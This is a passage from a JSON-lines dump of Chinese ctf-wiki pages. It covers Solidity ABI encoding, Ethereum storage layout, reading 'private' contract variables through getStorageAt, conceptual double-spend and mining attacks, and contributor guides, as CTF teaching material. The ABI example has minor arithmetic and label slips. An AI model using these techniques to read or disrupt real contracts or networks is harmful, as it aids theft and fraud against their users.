0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]\n6 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3\na 指向 [1,2] 的开始，所以 a=0x20*2=0x40\nb 指向 [3] 的开始，所以 b=0x20*5=0xa0\n\n然后是 [[1,2],[3]] 动态数组本身的 encoding\n0 - c                                                                  // offset of [[1,2],[3]]\n1 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1,2],[3]]\n2 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1,2]\n3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3]\n4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2]\n5 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1\n6 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2\n7 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]\n8 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3\nc 指向 [[1,2],[3]] 的开始，所以 a=0x20*2=0x40\n\n其次是 [\"one\",\"two\",\"three\"] 动态数组中每个 string 的 encoding\n0 - d                                                                  // offset for \"one\"\n1 - e                                                                  // offset for \"two\"\n2 - f                                                                  // offset for \"three\"\n3 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\"\n4 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\"\n5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\"\n6 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\"\n7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\"\n8 - 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\"\nd 指向 “one” 的开始，所以 d=0x20*3=0x60\ne 指向 “two” 的开始，所以 e=0x20*5=0xa0\nf 指向 “three” 的开始，所以 f=0x20*7=0xe0\n\n然后是 [\"one\",\"two\",\"three\"] 动态数组本身的 encoding\n0 - g                                                                  // offset of [\"one\",\"two\",\"three\"]\n1 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [\"one\",\"two\",\"three\"]\n2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for \"one\"\n3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for \"two\"\n4 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for \"three\"\n5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\"\n6 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\"\n7 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\"\n8 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\"\n9 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\"\n10- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\"\n这里 g 先不进行计算，因为涉及到函数参数整体的一个 encoding\n\n上面就已经把最后就是 [[1,2],[3]] 和 [\"one\",\"two\",\"three\"] 分析完毕，最后就是其作为一个整体进行 encoding\n0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1,2],[3]]\n1 - g                                                                  // offset of [\"one\",\"two\",\"three\"]\n2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1,2],[3]]\n3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1,2]\n4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3]\n5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2]\n6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1\n7 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2\n8 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]\n9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3\n10- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [\"one\",\"two\",\"three\"]\n11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for \"one\"\n12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for \"two\"\n13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for \"three\"\n14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\"\n15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\"\n16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\"\n17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\"\n18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\"\n19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\"\ng 指向字符串数组的开始，所以 g=0x20*10=140\n\n所以总的 selector + encoding 如下所示\n0xcc80bc65                                                             // function selector\n0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1,2],[3]]\n1 - 0x0000000000000000000000000000000000000000000000000000000000000140 // offset of [\"one\",\"two\",\"three\"]\n2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1,2],[3]]\n3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1,2]\n4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3]\n5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2]\n6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1\n7 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2\n8 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]\n9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3\n10- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [\"one\",\"two\",\"three\"]\n11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for \"one\"\n12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for \"two\"\n13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for \"three\"\n14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\"\n15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\"\n16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\"\n17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\"\n18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\"\n19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\"\n```\n\n## 例题\n\n### balsn 2020\n- 题目名称 Election\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n", "timestamp": "2025-10-21T22:02:43.818630"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/storage.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/storage.md", "content": "# Ethereum Storage\n\n## 插槽\n\n以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为 2^256 的超级数组中，数组中每个元素称为插槽，其初始值为 0。虽然数组容量的上限很高，但实际上存储是稀疏的，只有非零(空值)数据才会被真正写入存储。\n\n```\n# 插槽式数组存储\n----------------------------------\n|               0                |     # slot 0\n----------------------------------\n|               1                |     # slot 1\n----------------------------------\n|               2                |     # slot 2\n----------------------------------\n|              ...               |     # ...\n----------------------------------\n|              ...               |     # 每个插槽 32 字节\n----------------------------------\n|              ...               |     # ...\n----------------------------------\n|            2^256-1             |     # slot 2^256-1\n----------------------------------\n```\n\n当数据长度是已知时，其具体的存储位置将在编译时指定，而对于长度不确定的类型（如动态数组、映射），则会按一定规则计算存储位置。以下是对不同类型变量的储存模型的具体分析。\n\n## 值类型\n\n除映射和动态数组之外的所有类型，其数据长度都是已知的，如定长整型(`int`/`uint`/...), 地址(`address`), 定长浮点型(`fixed`/`ufixed`/...), 定长字节数组(`bytes1`-`bytes32`)，编译时将严格根据字段排序顺序，从位置 0 开始连续放置在存储中。如果可能的话，大小少于 32 字节的多个变量会被打包到一个插槽中，而当某项数据超过 32 字节，则需要占用多个连续插槽（`data.length / 32`）。规则如下：\n\n- 存储插槽的第一项会以低位对齐（即右对齐）的方式储存。\n- 基本类型仅使用存储它们所需的字节。\n- 如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移入下一个存储插槽。\n- 结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）。\n\n如以下合约：\n```solidity\npragma solidity ^0.4.0;\n\ncontract C {\n    address a;      // 0\n    uint8 b;        // 0\n    uint256 c;      // 1\n    bytes24 d;      // 2\n}\n```\n\n其存储布局如下：\n\n```\n-----------------------------------------------------\n| unused (11) | b (1) |            a (20)           | <- slot 0\n-----------------------------------------------------\n|                       c (32)                      | <- slot 1\n-----------------------------------------------------\n| unused (8) |                d (24)                | <- slot 2\n-----------------------------------------------------\n```\n\n## 映射\n\n对于形如 `mapping(address => uint) a;` 的映射类型变量，就无法简单仿照值类型按顺序储存了。对于映射，其会根据上节提到的规则占据位置 `p` 处的一个插槽，但该插槽不会被真正使用。映射中的键 `k` 所对应的值会位于 `keccak256(k . p)`， 其中 `.` 是连接符。如果该值同时是一个非基本类型，则将 `keccak256(k . p)` 作为偏移量来找到具体的位置。\n\n如以下合约：\n```solidity\npragma solidity ^0.4.0;\n\ncontract C {\n    mapping(address => uint) a;      // 0\n    uint256 b;                       // 1\n}\n```\n\n其存储布局如下：\n\n```\n-----------------------------------------------------\n|                    reserved (a)                   | <- slot 0\n-----------------------------------------------------\n|                      b (32)                       | <- slot 1\n-----------------------------------------------------\n|                        ...                        |   ......\n-----------------------------------------------------\n|                     a[addr] (32)                  | <- slot `keccak256(addr . 0)`\n-----------------------------------------------------\n|                        ...                        |   ......\n-----------------------------------------------------\n```\n\n## 动态数组\n\n对于形如 `uint[] b;` 的动态数组，其同样会占用对应位置 `p` 处的插槽，用以储存数组的长度，而数组真正的起始点会位于 `keccak256(p)` 处（字节数组和字符串在这里是一个例外，见下文）。\n\n如以下合约：\n```solidity\npragma solidity ^0.4.0;\n\ncontract C {\n    uint256 a;      // 0\n    uint[] b;       // 1\n    uint256 c;      // 2\n}\n```\n\n其存储布局如下：\n\n```\n-----------------------------------------------------\n|                      a (32)                       | <- slot 0\n-----------------------------------------------------\n|                    b.length (32)                  | <- slot 1\n-----------------------------------------------------\n|                      c (32)                       | <- slot 2\n-----------------------------------------------------\n|                        ...                        |   ......\n-----------------------------------------------------\n|                      b[0] (32)                    | <- slot `keccak256(1)`\n-----------------------------------------------------\n|                      b[1] (32)                    | <- slot `keccak256(1) + 1`\n-----------------------------------------------------\n|                        ...                        |   ......\n-----------------------------------------------------\n```\n\n## 字节数组和字符串\n\n如果 `bytes` 和 `string` 的数据很短，那么它们的长度也会和数据一起存储到同一个插槽。具体地说：如果数据长度小于等于 31 字节， 则它存储在高位字节（左对齐），最低位字节存储 `length * 2`。如果数据长度超出 31 字节，则在主插槽存储 `length * 2 + 1`， 数据照常存储在 `keccak256(slot)` 中。\n\n## 可见性\n\n由于以太坊上的所有信息都是公开的，所以即使一个变量被声明为 `private`，我们仍能读到变量的具体值。\n\n利用 web3 提供的 `web3.eth.getStorageAt()` 方法，可以读取一个以太坊地址上指定位置的存储内容。所以只要计算出了一个变量对应的插槽位置，就可以通过调用该函数来获得该变量的具体值。\n\n调用：\n\n```javascript\n// web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])\nweb3.eth.getStorageAt(\"0x407d73d8a49eeb85d32cf465507dd71d507100c1\", 0)\n.then(console.log);\n> \"0x033456732123ffff2342342dd12342434324234234fd234fd23fd4f23d4234\"\n```\n\n参数：\n\n- `address`：String - 要读取的地址\n- `position`：Number - 存储中的索引编号\n- `defaultBlock`：Number|String - 可选，使用该参数覆盖 web3.eth.defaultBlock 属性值\n- `callback`：Function - 可选的回调函数, 其第一个参数为错误对象，第二个参数为结果。\n\n## 例子\n\n以 Balsn CTF 2019 的 Bank 一题为例，更为具体讲解以太坊的存储布局。题目中变量和结构的定义如下：\n\n```solidity\ncontract Bank {\n    address public owner;\n    uint randomNumber = 0;\n    \n    struct SafeBox {\n        bool done;\n        function(uint, bytes12) internal callback;\n        bytes12 hash;\n        uint value;\n    }\n    SafeBox[] safeboxes;\n    \n    struct FailedAttempt {\n        uint idx;\n        uint time;\n        bytes12 triedPass;\n        address origin;\n    }\n    mapping(address => FailedAttempt[]) failedLogs;\n}\n```\n\n合约的变量按照以下布局存储在插槽 0 到 3 上：\n\n```solidity\n-----------------------------------------------------\n|     unused (12)     |          owner (20)         | <- slot 0\n-----------------------------------------------------\n|                 randomNumber (32)                 | <- slot 1\n-----------------------------------------------------\n|               safeboxes.length (32)               | <- slot 2\n-----------------------------------------------------\n|       occupied by failedLogs but unused (32)      | <- slot 3\n-----------------------------------------------------\n```\n\n对于结构 `SafeBox` 和 `FailedAttempt`，每个结构占据的存储布局如下：\n\n```\n# SafeBox\n-----------------------------------------------------\n| unused (11) | hash (12) | callback (8) | done (1) |\n-----------------------------------------------------\n|                     value (32)                    |\n-----------------------------------------------------\n\n# FailedAttempt\n-----------------------------------------------------\n|                      idx (32)                     |\n-----------------------------------------------------\n|                     time (32)                     |\n-----------------------------------------------------\n|          origin (20)         |   triedPass (12)   |\n-----------------------------------------------------\n```\n\n对于数组 `safeboxes`，数组内元素的起始点在 `keccak256(2)` 处，每个元素占据 2 个插槽；而对于映射 `failedLogs`，需要先通过 `keccak256(addr . 3)` 来得到特定地址 `addr` 对应数组的位置，该位置记录着数组的长度，而数组真正的起始点位于 `keccak256(keccak256(addr . 3))` 处，每个元素占据 3 个插槽。\n\n可以借助以下代码方便地计算数组和映射对应元素的真正位置：\n\n```solidity\nfunction read_slot(uint k) public view returns (bytes32 res) {\n    assembly { res := sload(k) }\n}\n\nfunction cal_addr(uint k, uint p) public pure returns(bytes32 res) {\n    res = keccak256(abi.encodePacked(k, p));\n}\n\nfunction cal_addr(uint p) public pure returns(bytes32 res) {\n    res = keccak256(abi.encodePacked(p));\n}\n```\n\n## 题目\n\n与以太坊的存储相关的攻击一般分为两类：\n\n- 利用以太坊上存储本质上都是公开的这一特性，任意读取声明为 `private` 的变量。\n- 结合任意写的漏洞，覆盖以太坊上的特定位置的存储\n\n### XCTF_final 2019\n- 题目名称 Happy_DOuble_Eleven\n\n### Balsn 2019\n- 题目名称 Bank\n\n## 参考\n\n- [以太坊智能合约 OPCODE 逆向之理论基础篇 - 全局变量的储存模型](https://paper.seebug.org/640/#_3)\n- [Solidity中文文档 - 存储中的状态变量储存结构](https://solidity-cn.readthedocs.io/zh/develop/miscellaneous.html)\n- [web3.js - Ethereum JavaScript API](https://web3js.readthedocs.io/en/v1.3.4/web3-eth.html)\n- [Balsn CTF 2019 - Bank](https://x9453.github.io/2020/01/16/Balsn-CTF-2019-Bank/)\n", "timestamp": "2025-10-21T22:02:43.949109"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/introduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/introduction.md", "content": "# Blockchain Security Overview\n\n> 区块链安全近几年发展比较迅速，但是 wiki 上没有相关内容，遂拉了几个小伙伴，一起撰写了区块链安全相关内容，可能某些用词不是很准确，还请见谅，也可以提问 issue，会及时更改\n\n概述区块链安全的一些方向，主要分为  **公链安全** 和 **智能合约** 安全\n\n## 公链安全\n\n待补充\n\n## 智能合约安全\n\n主要介绍使用 `Solidity` 这种主流编程语言的 Ethereum 安全方面的基础知识。", "timestamp": "2025-10-21T22:02:44.061861"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/publicblockchain/introduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/publicblockchain/introduction.md", "content": "# Public Blockchain Security Overview\n\n## 定义\n\n> A public blockchain has absolutely no access restrictions. Anyone with an Internet connection can send transactions to it as well as become a validator (i.e., participate in the execution of a consensus protocol). Usually, such networks offer economic incentives for those who secure them and utilize some type of a Proof of Stake or Proof of Work algorithm.\n\n> Some of the largest, most known public blockchains are the bitcoin blockchain and the Ethereum blockchain.   ------  from [wikipedia](https://en.wikipedia.org/wiki/Blockchain#Public_blockchains)\n", "timestamp": "2025-10-21T22:02:44.340454"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/publicblockchain/weaknesses.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/publicblockchain/weaknesses.md", "content": "# Blockchain Weaknesses\n\n## Double-spending attack\n\n双花问题是电子现金系统中的一个潜在问题，即相同的资金同时支付给两个接收者。区块链系统通过公开账本的方式来避免双花问题，用户广播交易时不会立即将其添加到区块链中，而是等待矿工通过挖矿将其打包在区块中，接收者在确定合法的交易已经添加到区块链之后，才可以认为该交易有效。用户通过在区块链上接收付款时等待确认来保护自己免受双花欺诈，随着确认数量的增加，交易变得更加不可逆转。\n\n但区块链系统并不能完全防止双花，攻击者仍可以通过庞大的哈希计算资源来重新完成已确认区块的工作量证明并使自己所在链成为最长链来逆转交易实现双花，以及可以针对某些未确认交易实现双花攻击。目前有一下常见的几种方式能够引发双花攻击：\n\n### 51% attack\n\n51％攻击通是指矿工试图控制超过50％的哈希率（挖矿算力）来实现双花，在此攻击中，攻击者可以阻止新交易被确认或撤销他们控制网络时已经确认的交易。\n\n由于比特币等Pow共识的区块链遵循最长链原则，当矿工发现全网有一条更长的链时，他就会抛弃他当前的链，把新的更长的链全部复制回来，在这条链的基础继续挖矿，而分叉出的短链则被丢弃掉。因此攻击者在与商家完成交易后从交易前分叉区块并通过掌握的足够多的算力持续挖出更长的链使发生交易所在的链丢弃来实现双花。\n\n理论上无法通过技术来防范51%攻击，而是通过经济学原理来避免，使达到全网51%的算力成本非常高，且拥有如此强大算力的攻击者进行正常挖矿比作恶作的收益更高。但对于小规模的山寨币来说，攻击成本较低，如Ethereum Classic网络曾遭受多次51%攻击。\n\n参阅: https://en.bitcoin.it/wiki/Weaknesses#Attacker_has_a_lot_of_computing_power\n\n- 题目名称 miniblockchain\n\n### Finney attack\n\nFinney attack（芬尼攻击）是由Hal Finney命名的，他是第一个描述扣块攻击的人。这种攻击是一种双花攻击的变化，攻击对象主要针对的是接受0确认的商家。\n\n攻击者将一个给自己转账的交易预挖为一个区块，但不立即将其广播到网络中，相反用同一笔代币花费在接受 0 确认的商家的交易中，攻击者在获得商家的交换物后、这笔交易A真正确认前，才广播他之前所预挖的区块使转给自己的交易合法，这时比特币网络会接受该有效块并使对商家的交易无效，最终达到双花的目的。\n\n0确认是指一笔交易被广播到全网，即将被打包进入区块前的状态。因为区块链目前的出块时间过慢，交易确认需要等待的时间较长，部分商家为了节省时间接受0确认的交易，也就是你把交易信息广播到全网就可以了，不需要等待打包入区块。\n\n### Race attack\n\n攻击者使用相同的资金连续广播两个冲突的交易，但最终只有一个交易得到确认。该攻击主要是控制矿工费来实现双花，同样针对接收0确认的商家，最终使发给自己的交易被打包确认而使另一个支付交易无效。  \n与芬妮攻击 的区别是，芬妮攻击是 0确认交易 vs 冲突块，竞争攻击是0确认交易 vs 冲突交易。\n\n### Vector76 attack\n\n也被称为一次确认攻击，是 Race attack 和 Fenny attack 的结合，使得具有一个确认的交易仍然可被撤销。\n\n在这种攻击中，一名矿工创建了两个节点，其中一个连接到商家节点，另一个节点连接到区块链网络中连接良好的节点。然后，矿工使用相同的资金创建两笔交易创建了两项交易，一笔交易发送给商家地址，我们称为交易1；一笔交易发送给自己的钱包地址且设置较高的矿工费，我们称为交易2。\n\n攻击者不立即广播这两笔交易而是在交易1的分支上进行挖矿，攻击者挖到区块后，向商家节点广播交易1，向另一个节点广播交易 2。交易2被认为有效后，攻击者立即把自己之前在交易1分支上挖到的区块广播给商家，这时，这个接受一次确认就支付的商家会确认交易成功。\n\n由于交易2发送给了连接到更多节点的节点，所以矿工在这个分支上挖出了更长链的机率更大，在这种情况下交易1会被回滚，从而实现了双花。\n\n参阅:  \nhttp://bitcointalk.org/index.php?topic=36788.msg463391#msg463391\nhttp://www.reddit.com/r/Bitcoin/comments/2e7bfa/vector76_double_spend_attack/cjwya6x\n\n## Block withholding attack\n\n扣块攻击最简单的形式是上述的芬妮攻击，但同样存在针对[矿池](https://academy.binance.com/zh/articles/mining-pools-explained)的扣块攻击方式。\n\n矿池最常见的支付机制是PPS（Pay-Per-Share)，该机制中矿工所贡献的每一个“share（股份）”都将收到固定的报酬，Share是用来记录矿工贡献的哈希值，这里的share并不是区块链网络中有效的哈希，而只是由矿池所设置的匹配条件。由于找到符合Pow区块链系统要求的解对于单独的矿工来说是极小概率事件，矿池为了更好衡量矿工们的工作量，会给矿工们设置一个合理的提交工作成果（Share）的门槛。\n\n扣块攻击是指恶意矿工在找到满足矿池要求结果，但不满足比特币系统要求的结果时，正常向矿池提交工作证明；一旦得到满足比特币系统要求的结果时，也就是真的挖到区块时，则把这个结果私自扣下，不向矿池提交，矿池便因此损失了对应的奖励。扣块攻击会使矿工和矿池都受损失，矿工只是得不到矿池分摊的Share奖励，但使矿池损失了出块奖励。\n\n## Selfish-Mining attack\n\n攻击者挖到新区块后藏起来不公布，其他诚实矿工因为不知道新区块的存在，还是继续在旧区块基础上挖矿。等到攻击者挖到第二个区块后便会同时公布手中藏着的两枚区块，这时，区块链分叉就出现了。只要攻击者比诚实矿工多挖一枚区块，攻击者所在的分叉就是最长链。因此，原本诚实矿工们所在的那条链，因为比攻击者的分叉链短便被作废了，此时攻击者因为挖到了两枚新区块而获得相应收益，而诚实矿工的奖励则被回滚。\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n", "timestamp": "2025-10-21T22:02:44.450952"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/contribute/basic-contribute-approach.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/contribute/basic-contribute-approach.md", "content": "# 基本贡献方式\n\n## 我之前没怎么用过 Github\n\n参与 Wiki 的编写**需要**一个 Github 账号， **不需要**高超的 Github 技巧。\n\n举个栗子，假如我想要修改一个页面内容，应该怎么操作呢？\n\n1. 在 [CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/) 上找到对应页面\n2. 点击 正文右上方、目录左侧的 **“编辑此页”** 按钮\n3. （应该已经跳转到了 Github 上的对应页面吧？）这时候右上方还会有一个 **“编辑此页”** 的按钮，点击它就可以在线编辑了\n4. 写好了之后点下方的绿色按钮，可能会提示没有权限。不必担心！Github 会自动帮你 fork 一份项目的文件并创建 Pull Request\n\n（有木有很简单？）\n\n如果还是不放心，可以参考以下资料：  \n\nhttps://guides.github.com/activities/hello-world/  \nhttps://guides.github.com/activities/forking/  \n\n## 我之前用过 Github\n\n基本协作方式如下\n\n1. Fork 主仓库到自己的仓库中。\n2. 当想要贡献某部分内容时，请务必仔细查看 **[Issue](https://github.com/ctf-wiki/ctf-wiki/issues)** 与 **[Project](https://github.com/ctf-wiki/ctf-wiki/projects)**，以便确定是否有人已经开始了这项工作。当然，我们更希望你可以加入 [Discord](https://discord.gg/ekv7WDa9pq)，以便于沟通与交流。\n3. 在决定将内容推送到本仓库时，**请你首先拉取本仓库代码进行合并，自行处理好冲突，同时确保在本地可以正常生成文档**，然后再 PR 到主仓库的 master 分支上。其中，PR 需要包含以下基本信息\n    * 标题：本次 PR 的目的（做了什么工作，修复了什么问题）\n    * 内容：如果必要的话，请给出对修复问题的叙述\n    * **注意，所有的内容都应该使用英语**\n4. 如果发现 PR 中有什么问题，请在 PR 中直接评论，并尽量给出修正的方式，或者也可以直接进行修改。 \n5. 提出该 PR 的人根据评论修正内容，然后将修改后的内容 Merge 到 master 分支中。\n\n目前，在人员较少的前提下，基本上可以忽略 4-5 步。\n\n## 注意\n\n- 每次 Pull Request 应只解决一个主要的事情，这样方便于进行修改。\n- 在每次 Pull Request 时，请确保自己在本地生成时，可以正确显示，并在 Pull Request 页面的评论中查看预览的站点是否为自己期望的样子。\n- 如果你想要开启一个新的章节，即编写目前 CTF Wiki 中没有的内容，请务必加入 [Discord](https://discord.gg/ekv7WDa9pq) 中交流，并在交流完毕后**将自己想要开启的新的章节以简明扼要的方式发起一个新的 issue**，以便于管理人员把这个放到对应 Project 的 In Process 栏中。\n- 在你成为团队成员后，你可以自由地编写 Project 中的内容。\n- 更多信息，请参见 [F.A.Q](https://github.com/ctf-wiki/ctf-wiki/wiki/F.A.Q)。\n", "timestamp": "2025-10-21T22:02:44.698153"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/contribute/documentation-requirement.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/contribute/documentation-requirement.md", "content": "# 贡献文档要求\n\n当你打算贡献某部分的内容时，你应该尽量确保\n\n- 文档内容满足基本格式要求\n- 文档的合理性\n- 文档存储的格式\n\n## 文档内容的基本格式\n\n这里主要是指 [中文排版指南](https://github.com/ctf-wiki/ctf-wiki/wiki/%E4%B8%AD%E6%96%87%E6%8E%92%E7%89%88%E6%8C%87%E5%8D%97) 与 [MkDocs 使用说明](https://github.com/ctf-wiki/ctf-wiki/wiki/Mkdocs-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E)。额外的基本要求如下\n\n- 之后可能会考虑为段落标题自动生成序号，所以我们不推荐在段落标题处增加序号。\n- 由于所涉及的题目我们都**合理**地放在了 `ctf-challenge` 仓库，所以我们无需在文档中注明题目的链接。而且，题目可能会随时移动，修复链接是一个非常费时间的事情。\n\n## 文档的合理性\n\n所谓合理性，指所编写的**内容**必须具有如下的特性\n\n- 由浅入深，内容的难度应该具有渐进性。\n- 逻辑性，对于每类内容的撰写应该尽量包含以下的内容\n    - 原理，说明该内容对应的原理。\n    - 例子，给出 1 ~ 2 个典型的例子。\n    - 题目，在该标题下， **只需要给出题目名字**。\n\n## 文档存储的格式\n\n对于每类要编写的内容，对应的文档应该存储在合适的目录下\n\n- figure，存储编写文档时所使用的图片。需要注意的是，图片要放在本地文件夹，避免引用外链。请使用相对路径 `./figure` 来索引图片。\n- **文件名请务必都小写，以 `-` 分割， 如 `file-name`**\n- 注意：无论是例子还是题目，**相应的附件都应该存储在 ctf-challenge 仓库中的对应目录中**。", "timestamp": "2025-10-21T22:02:44.921242"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/contribute/translation.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/contribute/translation.md", "content": "# 翻译\n\n目前，多语言的支持主要借鉴了 fastapi 的处理方式。需要注意的是，在翻译的过程中我们只需要确保不同语言在文件级别上保持一致。对于文件中具体的内容，不必过于拘谨，只需意思表达一致即可。\n\n## 完善已有语言\n\n这里我们以英语为例进行介绍。\n\n首先，我们需要确定英语对应的 2 个字母的代码，通过查询https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes，我们可以知道对应的代码为 `en`。\n\n在确定了代码后，我们就可以知道该语言的文档所在的目录，即 `docs/en`。\n\n假设我们想要翻译的文档为 `docs/zh/docs/contribute/translation.md`。那么，我们可以把该文件拷贝到 `docs/en/docs/contribute/translation.md`。同时，如果该文件依赖了图片，我们也需要拷贝对应的图片文件夹到相应的目录下。\n\n然后，我们可以打开中文对应的 mkdocs.yml，即 `docs/zh/docs/mkdocs.yml`，找到我们想要翻译的文件所在的位置，比如\n\n\n```yaml hl_lines=\"8\"\nnav:\n- Start:\n  - index.md\n  - discussion.md\n  - contribute/before-contributing.md\n  - contribute/basic-contribute-approach.md\n  - contribute/documentation-requirement.md\n  - contribute/translation.md\n```\n\n那我们应该在英语的配置文件中相应的层次结构处添加对应的文件。\n\n\n```yaml hl_lines=\"8\"\nnav:\n- Start:\n  - index.md\n  - discussion.md\n  - contribute/before-contributing.md\n  - contribute/basic-contribute-approach.md\n  - contribute/documentation-requirement.md\n  - contribute/translation.md\n```\n\n然后，我们就可以对其进行翻译。\n\n最后，我们可以使用 `python3 scripts/doc.py live en` 来预览修改后的内容。\n\n## 新增全新语言\n\n如果你打算添加一种尚未进行任何翻译的语言，比如说日语（ `jp`），你可以使用\n\n```python\npython3 scripts/doc.py new-lang jp\n```\n\n来进行初始化。此后，你就可以按照上一小节的方式来进行贡献了。", "timestamp": "2025-10-21T22:02:45.027059"}
